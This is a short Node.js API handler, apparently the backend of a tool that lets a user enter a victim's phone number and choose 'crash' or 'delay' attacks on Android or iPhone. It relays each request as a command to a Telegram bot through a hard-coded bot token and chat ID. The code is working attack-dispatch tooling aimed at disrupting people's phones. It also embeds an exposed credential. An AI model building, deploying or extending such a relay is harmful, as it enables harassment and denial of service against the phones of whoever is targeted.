// api/server.js
import fetch from "node-fetch";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method tidak diizinkan" });
  }

  const BOT_TOKEN = "7517164831:AAHhFDl-5T7SjRDIX7-FKI1B8iIumCPrGxY";
  const CHAT_ID = "6629230649";

  const COMMANDS = {
    "crash-android": "/crashandro",
    "crash-iphone": "/crashios",
    "delay-android": "/delayandro",
    "delay-iphone": "/delayios",
  };

  try {
    const { number, type } = req.body;

    if (!number || !type) {
      return res.status(400).json({ success: false, message: "Data kurang!" });
    }

    const command = COMMANDS[type];
    if (!command) {
      return res.status(400).json({ success: false, message: "Tipe command tidak valid!" });
    }

    const text = `${command} ${number}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text }),
    });

    res.json({ success: true, message: `☠️ Command terkirim: ${text}` });
  } catch (err) {
    console.error("Error:", err);
    res.status(500).json({ success: false, message: "Server error!" });
  }
      }
